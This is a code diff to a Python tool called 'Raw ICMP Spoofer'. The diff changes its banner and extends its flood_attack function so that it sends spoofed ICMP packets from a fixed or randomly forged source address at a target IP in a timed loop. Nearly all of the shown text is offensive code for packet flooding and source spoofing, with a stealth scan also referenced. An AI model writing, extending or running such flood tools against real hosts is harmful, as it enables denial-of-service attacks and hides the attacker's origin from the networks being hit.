@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 Raw ICMP Spoofer
 ================
@@ -36,13 +37,13 @@ class RawICMPSpoofer:
     def show_banner(self):
         """Display attack banner"""
         print(f"{Fore.RED}{Style.BRIGHT}")
-        print("██████╗  █████╗ ██╗    ██╗    ███████╗ ██████╗  ██████╗  ██████╗ ███████╗")
-        print("██╔══██╗██╔══██╗██║    ██║    ██╔════╝██╔═══██╗██╔═══██╗██╔════╝ ██╔════╝")
-        print("██████╔╝███████║██║ █╗ ██║    ███████╗██║   ██║██║   ██║█████╗   █████╗  ")
-        print("██╔══██╗██╔══██║██║███╗██║    ╚════██║██║   ██║██║   ██║██╔══╝   ██╔══╝  ")
-        print("██║  ██║██║  ██║╚███╔███╔╝    ███████║╚██████╔╝╚██████╔╝██║      ██║     ")
-        print("╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝      ╚═╝     ")
-        print("                     RAW SOCKET ICMP SPOOFER")
+        print("███████╗██████╗  ██████╗  ██████╗ ███████╗")
+        print("██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝")
+        print("███████╗██████╔╝██║   ██║██║   ██║█████╗  ")
+        print("╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ")
+        print("███████║██║     ╚██████╔╝╚██████╔╝██║     ")
+        print("╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ")
+        print("       RAW SOCKET ICMP SPOOFER")
         if self.namespace:
             print(f"                    Namespace: {self.namespace}")
         print(f"{Style.RESET_ALL}")
@@ -201,12 +202,18 @@ class RawICMPSpoofer:
                   f"{self.attack_stats['responses_received']} responses", end='', flush=True)
             time.sleep(0.5)
     
-    def flood_attack(self, target_ip, duration=60, delay=0.01):
+    def flood_attack(self, target_ip, source_ip=None, duration=60, delay=0.01):
         """Perform flood attack"""
         interface = self.get_namespace_interface() if self.namespace else None
         
+        # Use provided source IP or generate random ones
+        use_fixed_source = source_ip is not None
+        if not use_fixed_source:
+            source_ip = self.fake.ipv4()
+        
         print(f"{Fore.RED}FLOOD ATTACK")
         print(f"{Fore.YELLOW}Target: {target_ip}")
+        print(f"Source: {source_ip}" + (" (fixed)" if use_fixed_source else " (random IPs)"))
         if self.namespace:
             print(f"Namespace: {self.namespace}")
             if interface:
@@ -223,10 +230,15 @@ class RawICMPSpoofer:
         sequence = 1
         
         while time.time() - start_time < duration:
-            source_ip = self.fake.ipv4()
+            # Use fixed source IP if provided, otherwise generate random ones
+            if use_fixed_source:
+                current_source = source_ip
+            else:
+                current_source = self.fake.ipv4()
+                
             payload = f"flood_{sequence}".encode()
             
-            self.send_spoofed_packet(source_ip, target_ip, payload=payload, interface=interface)
+            self.send_spoofed_packet(current_source, target_ip, payload=payload, interface=interface)
             sequence += 1
             
             if delay > 0:
@@ -302,7 +314,7 @@ def main():
         targets = args.target.split(',')
         spoofer.stealth_scan(targets, args.type)
     elif args.flood:
-        spoofer.flood_attack(args.target, args.duration, args.delay)
+        spoofer.flood_attack(args.target, args.source, args.duration, args.delay)
     else:
         source_ip = args.source or spoofer.fake.ipv4()
         payload = args.payload.encode() if args.payload else b'raw_socket_test'
